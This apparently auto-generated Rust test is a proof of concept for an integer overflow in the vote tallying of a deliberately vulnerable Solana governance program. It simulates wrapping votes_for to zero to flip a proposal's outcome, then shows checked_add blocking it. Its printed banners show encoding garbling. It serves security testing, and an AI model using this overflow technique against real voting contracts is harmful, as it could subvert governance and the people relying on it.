//! Auto-generated Exploit PoC by Solana Security Swarm
//! Finding: SOL-003 â€” Integer Overflow in Unchecked Vote Arithmetic
//! Target: handle_vote_on_proposal (vulnerable-vault)
//! Impact: Vote count wraps around, flipping governance outcomes
//!
//! Attack: Create a voting escrow close to u64::MAX, then vote to
//! cause an overflow on votes_for/votes_against. This wraps the
//! count and can flip proposal outcomes.

#[test]
fn test_exploit_vote_overflow() {
    println!("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
    println!("â•‘  SOL-003: Vote Arithmetic Overflow PoC          â•‘");
    println!("â•‘  Target: vulnerable_vault::vote_on_proposal      â•‘");
    println!("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!();

    // Simulated proposal with legitimate votes
    let votes_for: u64 = 10_000_000_000;     // 10B tokens FOR
    let votes_against: u64 = 5_000_000_000;  //  5B tokens AGAINST

    println!("[SETUP] Legitimate votes");
    println!("        votes_for:     {}", votes_for);
    println!("        votes_against: {}", votes_against);
    println!("        Outcome:       PASSED (for > against)");
    println!();

    // Attack: create escrow with amount that causes overflow
    // u64::MAX = 18_446_744_073_709_551_615
    // We need votes_for + attack_amount to overflow past u64::MAX
    let attack_amount: u64 = u64::MAX - votes_for + 1; // wraps to 0

    println!("[ATTACK] Escrow amount: {} (u64::MAX - votes_for + 1)", attack_amount);

    // The vulnerable code does: votes_for += escrow.amount (unchecked)
    // In real Rust, this would panic in debug mode but wrap in release.
    // Simulating the wrapping behavior:
    let overflowed_votes_for = votes_for.wrapping_add(attack_amount);

    println!("[RESULT] votes_for after overflow: {}", overflowed_votes_for);
    println!("         votes_against:            {}", votes_against);
    println!();

    // The outcome flips â€” votes_for wraps to 0, which is < votes_against
    let outcome_before = votes_for > votes_against;
    let outcome_after = overflowed_votes_for > votes_against;

    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!("âœ… EXPLOIT: Vote Arithmetic Overflow");
    println!("ğŸ—³ï¸  Before attack: {} (for={} > against={})",
        if outcome_before { "PASSED" } else { "REJECTED" }, votes_for, votes_against);
    println!("ğŸ—³ï¸  After attack:  {} (for={} vs against={})",
        if outcome_after { "PASSED" } else { "REJECTED" }, overflowed_votes_for, votes_against);
    println!("ğŸ”„ Outcome flipped: {} â†’ {}",
        if outcome_before { "PASSED" } else { "REJECTED" },
        if outcome_after { "PASSED" } else { "REJECTED" });
    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");

    // Verify the secure version blocks this
    let secure_result = votes_for.checked_add(attack_amount);
    println!("ğŸ›¡ï¸  checked_add result: {:?} (None = overflow caught)", secure_result);
    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");

    assert!(outcome_before, "Before attack, proposal should pass");
    assert!(!outcome_after, "After overflow, proposal should be rejected (flipped)");
    assert!(secure_result.is_none(), "checked_add must catch overflow");
}
